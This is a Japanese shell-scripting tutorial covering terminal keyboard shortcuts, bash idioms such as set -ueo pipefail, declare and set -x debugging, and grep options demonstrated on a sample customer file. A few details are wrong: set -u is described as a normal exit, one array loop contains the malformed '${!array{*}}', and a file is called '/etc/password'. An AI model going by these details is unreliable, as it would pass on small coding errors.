---
title: "シェルスクリプト１０００本ノック"
date: 2023-02-01T13:08:01+09:00
draft: false
authors: suzuki
image: shellscript.jpg
categories:
  - programming
tags:
  - ワンライナー
  - Bash
  - シェルスクリプト
  - １０００本ノック
  - ターミナル
  - TIPS
  - マニアックコマンド
  - コマンド活用
  - 鈴木維一郎
---

# シェルスクリプト１０００本ノック
　これからシェルスクリプトを勉強する人、なんとか本を見ながらかけるようになった人、バリバリ書いてきたけど、まだまだ知らないことがないものかと勉強熱心な人。

　そんな人達のために「シェルスクリプト１０００本ノック」をご紹介します。
　興味のあるトピックを読むのもよし、上から順番に実行を確認して身につけるも良いです。
　じっくりやれば時間もかかりますが、Linuxで生きていくなら知っておいて損のないページです。

　書いてあることを暗記する必要はありません。
　どんなことが書いてあったかを覚えておけばよいです。
　必要になればこのページを開いて探せばよいのですから。

　シェルスクリプトでプログラムを書くにあたって、ちまたの本にはなかなか書いていないTIPSもいくつか紹介します。
　まずは、「ターミナルのTIPS」でキーボードショートカットを覚えましょう。
　「bashのTIPS」は、中級者のbashプログラマにとっても大いに参考になると思います。
　「名著紹介」では、僕がプログラマとしておおいに感銘を受けた一冊のエッセンスをご紹介します。是非購入して購読いただければと思います。UNIXという考え方をしっかり意味のあるこころのある内容で説明してくれた数少ない素晴らしい名著です。
　シェルクスクリプトを作るためにおおよそ必要なコマンドリファレンスをページの中盤から集めてあります。
　特に、シェルスクリプトを支える三本柱であるgrepやawk、sedといったコマンドについては、情報を厚めに入れてあります。

　ページ後半には、自作コマンドを数本紹介しています。
　すべてシェルスクリプトで作ってありますので、改造してより良いコマンドに仕上げてもらえれば嬉しいです。

　grepやawk、sedコマンドなどを駆使したシェルスクリプトでできることは無限です。
　すべてを覚えてしまおうというのはどだい無理なのです。
　まずは、このページのコマンドを順番に実行して、感覚を身につけてください。
　浅くとも何度も繰り返し反復することで、直感的に理解して実行することができます。

　ちなみに１０００本というのは勢い余っていっていますがだいたい７００本ですが、これからも内容を充実させていくつもりです。

　でははじまりはじまり。
　シェルスクリプトを楽しんでください！



## ターミナルのTIPS
### Ctrl f カーソル位置を後方に位置文字ずつ移動
`Ctrl f`は、カーソル位置を後方に位置文字ずつ移動します。
```
Ctrl f : カーソル位置を後方に位置文字ずつ移動します。
```

### Ctrl b カーソル位置を前方に位置文字ずつ移動
`Ctrl b`は、カーソル位置を前方に位置文字ずつ移動します。
```
Ctrl b : カーソル位置を前方に位置文字ずつ移動します。
```


### Ctrl l 画面をクリアする
`Ctrl l`は、画面がコマンドで一杯になった、ログを出力して画面が埋まってしまう、等の場合、`Ctrl l`コマンドで画面をクリアすることができます。
日常的に非常によく使うコマンドです。
```
Ctrl l : クリアと同等。 
```

### Ctrl m Enterキーを使わない
`Ctrl m`は、キーボードのEnterキーと同じ挙動です。
メリットは、指をFとJといったホームポジションから外すことなく操作できることです。
```
Ctrl m : Enterと同じ
```


### Ctrl n 下矢印キーを使わない
`Ctrl n`は、キーボードの下矢印キーと同様の振る舞いをします。
メリットは、指をFとJといったホームポジションから外すことなく操作できることです。
```
Ctrl n : 下矢印と同じ。 
```


### Ctrl p 上矢印キーを使わない
`Ctrl p`は、キーボードの上矢印キーと同様の振る舞いをします。
メリットは、指をFとJといったホームポジションから外すことなく操作できることです。
```
Ctrl p : 上矢印と同じ。 
```


### Ctrl r 同じコマンドを再入力しない
`Ctrl r`は、コマンド履歴の後方検索を開始します (後方に移動するには Ctrl r を押し続けます) 
`Ctrl p`や`Ctrl n`で過去のコマンド履歴を順にたどっていってもよいのですが、過去のコマンド履歴を簡単に検索して実行することができます。
`Ctrl r`を押して、冒頭行から数文字を入力することでマッチする過去のコマンドが表示されます。
```
Ctrl r : コマンド履歴の後方検索
```


### Ctrl h カーソル位置の手前の文字を削除（BackSpaceキーを使わない）
`Ctrl h`は、キーボードのBackSpace、Macではdeleteキーと同じ挙動です。
メリットは、指をFとJといったホームポジションから外すことなく操作できることです。
```
Ctrl h : BackSpaceと同じ。カーソル位置の手前の文字を削除します。
```


### Ctrl d カーソル位置の文字を削除（BackSpce/deleteとは異なります）
`Ctrl d`は、カーソルの下の文字を削除します。
BackSpce/deleteは、カーソル手前の一文字を削除しますが、このコマンドはカーソル位置の文字を削除します。
```
Ctrl d : カーソル下の文字を削除します。
```

### Ctrl u カーソル位置の手前から行頭までのすべてのテキストを削除
`Ctrl u`は、行頭まで削除します。
カーソルの１文字手前から行頭までを削除します。
```
Ctrl u : カーソル位置の手前から行頭までのすべてのテキストを削除します。
```


### Ctrl k カーソル位置から行末までのすべてのテキストを削除
`Ctrl k`は、カーソルから行末までのすべてのテキストを削除します。 
`vim`の `Shift d`コマンドと同じです。
```
Ctrl k : カーソルから行末までのすべてのテキストを削除します。 
```


### Ctrl x BackSpace カーソル位置から行頭までのすべてのテキストを削除します。
`Ctrl x BackSpace`は、行頭からカーソルまでのすべてのテキストを削除します。 
`BackSpace`を使わずに`Ctrl h`を使う。とか言っておきながらなんなのですが、便利なので覚えてください。
Ctrl xに続いてBackSpceを押します。
```
Ctrl x backspace : 行頭からカーソルまでのすべてのテキストを削除します。 
```


### Ctrl a コマンド行先頭へジャンプ
`Ctrl a`は、コマンドの行頭に移動します。
頻繁に利用される必須のコマンドの1つです。
```
Ctrl a : 行頭に移動します。 
```


### Ctrl e コマンド行末へジャンプ
`Ctrl e` コマンドの行末に移動します。 
頻繁に利用される必須のコマンドの1つです。
```
Ctrl e : 行末に移動します。 
```

### Ctrl t 前後の文字を入れ替え
`Ctrl t` は、カーソルの前の文字をカーソルの下の文字と入れ替えます。
例えば Windows というコマンドを入力したいとします。
キーボードの入力で Windwos となってしまった場合、wとoを入れ替えたいと考えます。
この場合、windwosの o にカーソルを移動して `Ctrl t` を実行します。
```
Ctrl t : カーソルの前の文字をカーソルの下の文字と入れ替えます。Esc t を押すと、カーソルの前の 2 つの単語が入れ替えられます。 
```


### Ctrl w カーソル位置の手前の単語を切り取り貼り付ける
`Ctrl w`は、カーソルの前の単語を切り取ります。
切り取った単語はクリップボードの保存されるので、`Ctrl y` で貼り付ける事ができます。
```
Ctrl w : カーソルの前の単語を切り取ります。Ctrl y 貼り付けます 
```


### Ctrl u カーソル位置の手前から行頭を切り取り貼り付けます。
`Ctrl u`は、カーソル位置の手前から行頭にかけてすべての文字列を切り取ります。
`Ctrl y`で貼り付ける事ができます。
```
Ctrl u : カーソルの前の行を切り取ります。次に Ctrl y で貼り付けます
```


{{% tips-list tips %}}
ヒント
: とにかく、ゆっくりとコマンドを入力することです。
何度も繰り返しゆっくりと実行することで、いずれ素早く実行できるようになります。
焦ってはいけません。
{{% /tips-list %}}


### 【超裏技】 Esc #(Shift 3) コマンドライン行をコメントアウトして改行
このTIPSはものすごく便利です。
必ず覚えておくと良いことがあります。

まず、ある程度長いコマンドを入力し終わってEnterキーを押して実行しようとしているとします。
「あ・・」と、気がついて「ディレクトリに入るのを忘れてた」と思い出します。
`cd hoge` など、ディレクトリ移動をして、先程の長いコマンドを再入力する。

こんな面倒なことってよくありますよね。


### 一般的な方法 Ctrl a ＋ #(Shift 3)

```
$ ./configure sutasuta hoihoi option=hoge
```

と、入力して、このコマンドラインのカーソル行を`Ctrl a`で先頭に移動して、#(Shift 3)を入力してEnterキーを押す。

そうすると、コマンドラインは以下のようになります。

```
$ #./configure sutasuta hoihoi option=hoge 
```

ここで改めて
```
$ cd hoge
```

で、ディレクトリに入ってから、`Ctrl p`で１つ前のコマンドを呼び出して、行頭の`#`を`Ctrl d`で消します。

```
$ #./configure sutasuta hoihoi option=hoge 
<Ctrl d で行頭の # を消す>
$ ./configure sutasuta hoihoi option=hoge 
<Enterキーで実行>
```

### 超裏技 Esc ＋ #（Shift 3）
もう少し楽にできるショートカットが用意されています。
`Esc` を押し離してから`#（Shift+3）`を押します。
すると一瞬でコマンドラインの行頭に # が付与されて改行されます。


まず、先走ってコマンドラインを入力したとします。
```
$ ./configure sutasuta hoihoi option=hoge 
```

`Esc #` でコマンドラインをコメントアウトします。
```
$ #./configure sutasuta hoihoi option=hoge 
```

その後、あらためて`cd hoge`でディレクトリ移動
```
$ cd hoge
```

`Ctrl p`で１つ前のコマンドを呼び出して、`Ctrl d`で行頭の`#`を消す

```
<Ctrl p>で１つ前のコマンドを呼び出す
$ #./configure sutasuta hoihoi option=hoge 

<Ctrl d で行頭の # を消す>
$ ./configure sutasuta hoihoi option=hoge 

<Enterキーで実行>
```


まとめると、
1. `Esc #`でコマンドラインをコメントアウト
2. 何らかの別コマンドを入力
3. `Ctrl p`で先程のコマンドラインを呼び出す
4. `Ctrl d`で行頭の`#`を削除してEnter

{{% tips-list tips %}}
ヒント
: `Esc #` はコマンドライン全体をコメントアウトして改行するコマンドです。
一度入力したコマンドを再入力する手間が省けます。
{{% /tips-list %}}

## bashのTIPS
### set -ueo
`set`コマンドで便利にプログラミングする手法を紹介します。古来から伝わる便利な一行です。

``` bash
#! /usr/bin/bash

set -ueo pipefail
```

`set -u` : 未定義の変数を使用した箇所でスクリプトが正常終了します。変数名が異なる場合も実行できてしまうなどのありがちがバグを未然に防ぐことができます。

`set -e` : スクリプトの実行中にエラーが発生した場合、エラーの箇所でスクリプトの処理が終了します。通常は、エラーが発生しても実行は中断されず、エラー箇所を特定するのはとても大変ですが、`set -e` オプションを付けておくとエラー箇所の特定が比較的カンタンになります。

`set -o pipefail` : コマンド同士の連結にパイプ「｜」を使いますが、パイプ箇所でエラーが発生した場合に、パイプで連結したどのコマンドでエラーが発生したのかを特定することができます。

上記３つのオプションを結合すると `set -ueo pipefail`をなります。通常、行頭のシェバン「#!/usr/bin/bash 」の下に一行空行を置き、その下に `set -ueo pipefail`を書くと良いです。


### 変数の型を指定する

シェルスクリプトでは変数の型を指定する必要はありませんが、指定しておくことで、間違った値を代入することがなくなり、しいてはバグが減ります。

変数を数値として宣言する
iオプションを使用します。

``` bash
declare -i num=1+2
str=1+2

echo $num # => 3
echo $str # => 1+2
```


変数を配列として宣言する
aオプションを使用します。

``` bash
declare -a array=( Java Ruby Python )

echo ${array[0]} # => Java

echo ${#array[*]} #=> 3(配列の要素数)

for e in ${array[*]}
do
  echo $e # => Java, Ruby, Pythonの順に出力
done

for i in ${!array{*}}
do
  echo ${array[i]} # => Java, Ruby, Pythonの順位出力
done
```

変数を定数（読み取り専用）とし、初期化時に値を代入する
-r オプションを使います。

``` bash
#!/usr/bin/bash

set -ueo pipefail

declare -r num=5;

str=$((num+2));
echo $num # => 5
echo $str # => 7
```

### ローカル変数を定義する
シェルスクリプトはどこで宣言しようとすべてグローバル変数として扱われますが、`local`をつけることによって、明示的にもローカル変数を定義することができます。

``` bash
function fn() {
  # 問題のある例:
  local hoge=$(false)
  # $? で直前に実行したコマンドの終了ステータスを参照できる
  echo $? # => エラーが握りつぶされ 0 が返る！
 
  # 問題のない例:
  local hoge2
  hoge2=$(false)
  echo $? # => 正しく 1 が返る
}
```

### インクリメント

インクリメントなどは以下のように書くことができます。

一般的な書き方
``` bash
#!/usr/bin/bash

set -ueo pipefail 

value=0;
value=`echo "$value+1" | bc`;
echo "valueの値は " $value;
```

スッキリとした書き方
``` bash
#!/usr/bin/bash

set -uo pipefail  # eをつけると動きません

declare -i value=0;
((value++));
echo "valueの値は" $value;
```

### if C言語やJavaのような条件式で記述する

メリットは以下のとおりです。
・半角空白を配置する必要がない
・一般的に短い行で記述できるようになる
・条件式の変数に「$」を付ける必要がない
・-gt は >、 -lt は <、-leは<=、で普通に記述できる

一般的な記述
``` bash
#!/usr/bin/bash

set -ueo pipefail

x=4;
if [ "$x" -gt 2 ] && [ "$x" -le 5 ]; then
  echo "$x は 2 より大きいかつ 5 以下です";
fi
```

拡張した記述
``` bash
#!/usr/bin/bash

set -ueo pipefail

x=4;
if ((x>2 && x<=5)); then
  echo "$x は 2 より大きいかつ 5 以下です";
fi
```


### while C言語やJavaのような条件式で記述する

スッキリとした書き方
``` bash
#!/usr/bin/bash

set -ueo pipefail

declare -i i=0;
while((i++<10));do
  echo $i;
done
```

### for C言語やJavaのような条件式で記述する

スッキリとした書き方
```
#!/usr/bin/bash

set -ueo pipefail

for((i=1;i<=10;i++));do
  echo $i;
done
```

doやdoneを使わないもっとスッキリとした書き方
```
#!/usr/bin/bash

set -ueo pipefail

for((i=1;i<=10;i++)){
  echo $i;
}
```

### grepで該当文字列があったら反応する

``` bash
# 一般的には以下のようにします。
if cat hoge.txt | grep "Apple" >/dev/null; then
  echo "hoge.txtにはAppleが含まれた行がある"
fi

# --quiet は標準出力に何も書き出さないオプション
if cat hoge.txt | grep --quiet "Apple"; then
  echo "hoge.txtにはAppleが含まれた行がある"
fi
 
# 条件の反転は ! をつける
if ! cat hoge.txt | grep --quiet "Apple"; then
  echo "hoge.txtにはAppleが含まれた行がない"
fi
```

### 長い行の改行について

長い行の改行はバックスラッシュを末尾につける

```
aws --region ap-northeast-1 cloudformation deploy \
  --template-file ./packaged-template.yaml \
  --stack-name example-stack \
  --capabilities CAPABILITY_IAM \
  --parameter-overrides \
    Environment=development \
    EnableDebugLog=true
```

驚いたことに（僕も驚きました）パイプラインでの改行はエスケープがいらない！

``` bash
cat access.log |
  # IPアドレスのカラムを取得する
  awk '{print $5}' |
  # 100行目以降のみを集計対象とする
  tail +100 |
  # IPアドレスごとのアクセス数のランキングを集計する
  sort | uniq -c | sort -nr
```

### 関数パラメータは変数に格納する

関数に渡された値は $1,$2...というふうにアクセスできます。
とはいえ、関数の中で $1,$2を使うとなにがなんだかわかりにくくなります。
ですので、関数冒頭で変数に格納しましょう。
もちろん忘れずに変数には`local` 変数をつけましょう。
変数の型がわかっているのであれば（わかっているでしょう）、declare -i などで明示的に変数の型を指定するのが望ましいのです。

``` bash
function do_something() {
  # まず最初に引数を意味のある命名の変数に取り出す
  local target_dir;
  local action

  target_dir=$1;
  action=$2;
}
```


### スクリプトのデバッグ

Bashは広範なデバッグ機能を提供しています。

デバッグの方法は３種類あります

１．ターミナルの実行時に -x オプションを付与する

```
$ bash -x helloScript.sh
```

２．ソースコードの冒頭のシェバンに -x オプションを付与する

``` bash:debug.sh
#!/bin/bash -x
:
:
```


３．デバッグの開始点と終了点を決めてデバッグ
デバッグの開始点にコマンド 'set -x'終了点には 'set +x' と書きます。


``` bash:debug2.sh
#!/bin/bash 

set -x
echo "置き換えたいファイル名を入寮して下さい。"
read fileName
set +x

if [[ -f "$fileName" ]]; then
  sed -e "s/Linux/Unix/g" "$fileName";
else
  echo "$fileName はありません。";
fi
```

```
$ bash test
+ echo 置き換えたいファイル名を入寮して下さい。
置き換えたいファイル名を入寮して下さい。
+ read fileName
grepfile.txt
+ set +x
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
$
```


``` bash:debug3.sh
#!/bin/bash

# デバッグ開始
set -x

var1=`date +%M`

# デバッグ終了
set +x

var2=`ls -1 | wc -l`
var3="DEBUG TEST"

exit 0
```

```
$ bash debug3.sh
++ date +%M
+ var1=56
+ set +x
$
```


{{% tips-list tips %}}
ヒント
: 色々と便利なbashですが、これからも便利な書き方があれば更新してきます。
{{% /tips-list %}}

### マルチラインコメント
<font color=orange><b> 複数行コメントの使用</b></font>
bashではさまざまな方法で複数行コメントを使用できます。
次の例に簡単な方法を示します。
'multiline-comment.sh'という名前の新しいbashを作成し、次のスクリプトを追加します。
ここでは、「:」と「'」でbashで複数行コメントを実現しています。
次のスクリプトは、5の2乗を計算します。

{{% tips-list tips %}}
ヒント
: 「:」と「'」の間は半角スペースを入れます。
{{% /tips-list %}}


``` bash:multiline-comment.sh
#!/bin/bash

: '
次のスクリプトは、
数値の2乗値5を計算します。
'
((area=5*5));
echo "$area";
```
bashコマンドでファイルを実行します。

```
$ bash multiline-comment.sh
25
$
```

{{% tips-list tips %}}
ヒント
: 多くの場合、マルチラインコメントの存在は知られていない。
: ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。
: それは、過去のメジャーソースコードの冒頭にそうあるからだ。
: そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのだ。

: 今後出てくるであろうファイルの生成に「touch」というコマンドがある。これ実は 「:>ファイル名」で、空のファイルを生成する事ができる。「:」は、”なにもしないことを示す。if文の中で何もしない場合は、以下のように記述する。

: if [ "$v" -eq 5 ];then
:   : # 何もしない
: fi

: touchは既にファイルがあれば、そのファイルにはさわらない。
: :> は既にファイルがあれば、そのファイルさえも空にする。
: 上記 if 文の中の : は　何もしないことを示す。
: マルチラインコメントも同じ「:」から始まり、何もしないことを示している。
 
{{% /tips-list %}}


## grep のTIPS
grep（グレップ）コマンド。UNIX/Linuxにおいてこれほど歴史あり、強力なコマンドはありません。そして多くのユーザーがこのコマンドを使いこなしています。Webサーバーのログから特定のユーザーのみを抽出するちいさなスクリプトから、膨大なシステムログからロケットの軌道修正を計算する処理プログラムなど、半世紀もの長い間、一糸乱れることなく動き続けています。

「grep」コマンドは、文字列、またはファイル内のをテキストを検索するための便利で不可欠なコマンドです。
「grep」コマンドの正式な名称は「“global regular expression print.”」です。
このコマンドの名前は、正規表現に基づいてコンテンツを検索できる「g / re / p」に由来しています。
「grep」コマンドには、ファイル内の文字列またはテキストを検索するため、複数の方法が用意されている。

以下に「grep」コマンドを使用するいくつかの構文を示します。

### カラー表示

まず、grep コマンドをカラー表示にしてみます。
以下のコマンドで、~/.bashrc を開きます。
```
$ vim ~/.bashrc
```

以下の2行を ~/.bashrc に追記して保存して下さい。

``` bash:~/.bashrc
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias ls='ls -FG'; 
```

grep/egrep/fgrep そしてついでに lsコマンドもカラー表示に変更します。変更したら ~/.bashrcを以下のコマンドで再読込します。

```
$ . ~/.bashrc
$ 
```

では、grep コマンドを使ってみます。
ここでは /etc/passwordファイルをgrepしてrootを検索してみます。

<pre>
$ grep root /etc/password
$
</pre>

###  構文
次の「grep」コマンドは、ファイル内の特定の文字列またはテキストを検索するために使用されます。

```
$ grep 検索文字列 ファイル名
```

次の「grep」コマンドは、複数のファイル内の特定の文字列またはテキストを検索するために使用されます。


```
$ grep 検索文字列 filename1 filename2 filename3
$ 
```

次は、空白を含む文字列を検索します。この場合はシングルクォーテーション「'」、またはダブるクォーテーション「"」で文字列を囲む必要があります。

```
$ grep "検索文字列 検索文字列" filename1
$ 
```

次の「grep」コマンドは、ファイル内の特定のオプションを含む文字列を検索するために使用されます。「 grep」コマンドでは、さまざまな目的でさまざまなオプションが使用されます。
ここでは「-v」を紹介します。「-v」オプションは、検索文字列を含まない行を抽出するオプションです。
このオプションは、非常に多くの場面で利用されます。

<pre>
$ cat /etc/passwd | head
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
bash-5.1$ cat /etc/passwd | head
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
$
bash-5.1$ cat /etc/passwd | head | grep "User"
# <font color=red>User</font> Database
$
$ cat /etc/passwd | head | grep -v "User"
##
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
$ 
</pre>

まず、

```
$ cat /etc/passwd
$
```

で、/etc/passwd ファイルをcat します。
catするというのは、ファイル内容を出力すると言う意味になります。さらに、

```
$ cat /etc/passwd | head 
$
```

の、headは、出力された /etc/passwd ファイルの冒頭１０行を抽出するというコマンド「head」です。「head」コマンドで -n5 オプションをつけることで冒頭5行目とすることもできます。

```
$ cat /etc/passwd | head -n5
$
```

シェルスクリプトは、「| 」パイプでコマンドを連ねることで、前のコマンドに続いて、さらにコマンドの出力結果を絞り込むことができます。
次のコマンドは、/etc/passwd ファイルを catコマンドで表示し、headコマンドで冒頭１０行を抽出、さらに grep -v コマンドで User を除く行を出力します。
```
$ cat /etc/passwd | head | grep -v "User"
```

「 grep -v 」コマンドは、指定した文字列を含まない行を抽出するという意味です。

-v をつけなければ、User という文字列を含む文字列が抽出されることになります。

さらにgrepには強力な「-i」オプションがあります。
「-i」オプションは、検索文字列の大文字、小文字を区別せずに抽出します。

```
$ cat /etc/passwd | head | grep -iv "user"
##
#
# Note that this file is consulted directly only when the system is running
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
$
```
{{% tips-list tips %}}
ヒント
: grep コマンドで最も使われる書式は
:  $ cat <ファイル名> | grep "検索文字列"
: です。
: 以下、'-v' '-i' 二つのオプションをパイプで駆使すればgrepコマンドを使いこなしていると言っても過言ではありません。
<pre>
# -v 除外
$ cat <ファイル名> | grep -v "検索文字列"

# -i 大文字小文字を区別しない
$ cat <ファイル名> | grep -i "検索文字列"
</pre>
{{% /tips-list %}}



### 一致する文字列を検索

では手始めに、次のコマンドで、Customers.txtファイルの内容を表示します。以下の内容をCustomers.txtとして保存して下さい。

``` bash:Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
```

Customers.txtを表示します。

```
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
```

次の「grep」コマンドは、Customers.txtファイルのテキスト「 MalihaChowdhury 」を検索します。検索テキストがファイルに存在する場合、テキストを含む行が印刷されます。

<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep Ali
45  Minhaz <font color=red>Ali</font>      ali@gmail.com       +8801190761212
$
</pre>


次の「grep」コマンドは、Customers.txtファイルのテキスト「 MalihaChowdhury 」を検索します。検索テキストがファイルに存在する場合、テキストを含む行が印刷されます。

<pre>
$ cat Customers.txt | grep 'Maliha Chowdhury'
56  <font color=red>Maliha Chowdhury</font>    maliha@gmail.com        +8801820001980
$
</pre>


### 一致しない文字列のみを検索

「grep」コマンドの-vオプションは、ファイルから一致しない文字列を検索するために使用されます。この例では、-vオプションを指定した「grep」コマンドを使用して、最初の例で作成したCustomers.txtファイルから一致しない文字列を検索しています。

次のコマンドは、customers.txtファイルの内容を表示します。

<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -v 'Abir'
ID  Name            Email           Phone
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>

{{% tips-list tips %}}
ヒント
: -vオプションは、ファイルから一致しない文字列を検索するために使用されます。
: 
: 検索文字列を除外して検索する場合は、'-v'オプションを使います。
$ cat <ファイル名> | grep -v "検索文字列"
{{% /tips-list %}}



### 大文字と小文字を区別しない一致の検索文字列
「grep」コマンドは、デフォルトで大文字と小文字を区別してファイルから文字列を検索します。
「grep」コマンドの '-i' オプションは、大文字と小文字を区別しない方法でファイルから文字列を検索するために使用されます。
この例では、'-i' オプションを指定した「grep」コマンドを使用して、前に作成したCustomers.txtファイルから大文字と小文字を区別しない方法で特定の文字列を検索しています。


<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -i 'minhaz'
45  <font color=red>Minhaz</font> Ali      ali@gmail.com       +8801190761212
$
</pre>


{{% tips-list tips %}}
ヒント
: 文字が大文字または小文字の文字列を含む1つ以上の行がファイルに存在する場合、その行が出力されます。
: 大文字小文字を区別しないで検索する場合は、'-i'オプションを使います。
$ cat <ファイル名> | grep -i "検索文字列"
{{% /tips-list %}}



### 単語全体のみを検索

「grep」コマンドの '-w' オプションは、大文字と小文字を区別してファイルから単語全体を検索するために使用されます。
この例では、'-w' オプションを指定した「grep」コマンドを使用して、最初の例で作成されたCustomers.txtファイルから単語全体を検索しています。

次のコマンドは、customers.txtファイルの内容を表示します。

```
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
```

次の「grep」コマンドは、文字列「Ma」を含むテキストファイルの行を検索します。ファイルのいずれかの行に文字列「Ma」が含まれている場合、その行が出力されます。

<pre>
$ cat Customers.txt | grep 'Ma'
56  <font color=red>Ma</font>liha Chowdhury    maliha@gmail.com        +8801820001980
79  <font color=red>Ma</font>ruf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>

次の「grep」コマンドは、「Ma」という単語を含むテキストファイルの行を「正確」に検索します。
ファイルのいずれかの行に「Ma」という単語が正確に含まれている場合、その行が出力されます。
「Ma」という単語がないため、出力されません。

```
$ cat Customers.txt | grep -w 'Ma'
$ 
```

次の「grep」コマンドは、「Maliha」という単語を含むテキストファイルの行を正確に検索します。
ファイルのいずれかの行に「Maliha」という単語が正確に含まれている場合、その行が出力されます。

<pre>
$ cat Customers.txt | grep -w 'Maliha'
56  <font color=red>Maliha</font> Chowdhury    maliha@gmail.com        +8801820001980
$
</pre>

{{% tips-list tips %}}
ヒント
: '-w' オプションと検索語「Ma」を指定した「grep」コマンドは、テキストファイルに「Ma」という単語が含まれていないため、何も返しませんでした。
: -wオプションと検索語「Maliha」を指定した「grep」コマンドは、「Maliha」という単語を含むファイルの5行目を返しました。
: '-w' オプションは正確な単語を検索対象とするオプションです。
{{% /tips-list %}}



### 現在のディレクトリで複数のファイルを検索する

「grep」コマンドは、ファイル内の特定のコンテンツを検索し、検索文字列またはパターンに基づいて現在のディレクトリ内の複数のファイルを検索するために使用されます。
\* ワイルドカードを使用して現在のディレクトリ内の複数のファイルを検索する方法は、Customers.txtファイルのこの例に示されています。

次の「grep」コマンドは、「split」という単語を含む現在のディレクトリのファイルを再帰的に検索します。
'split'という単語を含む現在のディレクトリとサブディレクトリのファイルは、次の行で出力されます。

```
$ grep -w split *
$ 
```


### ディレクトリを再帰的に検索する
'-r' オプションは、「grep」コマンドとともに使用して、ディレクトリ内の特定の文字列またはパターンを再帰的に検索します。
この例では、「grep」コマンドを使用して現在のディレクトリを再帰的に検索し、Customers.txtファイルを検索します。

```
$ grep -wr split *
$ 
```

{{% tips-list tips %}}
ヒント
: ディレクトリを指定して再帰的に検索したい場合は、
$ grep 検索文字列 検索したい場所
: となります。
<pre>
$ grep -wr kpasswd /etc/services
<font color=red>kpasswd</font>         464/udp     # kpasswd
<font color=red>kpasswd</font>         464/tcp     # kpasswd
<font color=red>rpasswd</font>	        774/tcp #
$
</pre>
{{% /tips-list %}}


### 行番号を出力に追加します
「grep」コマンドの '-n' オプションは、ファイルの行番号とともに検索文字列の出力を出力するために使用されます。
この例では、'-n' オプションを指定した「grep」コマンドを使用して、最初の例で作成されたCustomers.txtファイルの行番号を含む検索出力を表示しています。

<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -n "Ali"
4:45  Minhaz <font color=red>Ali</font>      ali@gmail.com       +8801190761212
$
</pre>

{{% tips-list tips %}}
ヒント
: ターミナルから前のコマンドを実行すると、次の出力が表示されます。文字列「Riya」はファイルの3行目にあります。4行目と5行目は、一致する行の次の2行です。したがって、3行目、4行目、および5行目は、一致する文字列を強調表示することによって出力に出力されています。 
{{% /tips-list %}}


### 一致する行の後に特定の行数を印刷します
数値を含む '-A' オプションは、ファイル内で見つかった一致する文字列またはパターンの後に特定の行数を出力するために使用されます。
この例では、Customers.txtファイルに対して「grep」コマンドの '-A' オプションを使用しています。


<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -A2 "Ali"
45  Minhaz <font color=red>Ali</font>      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
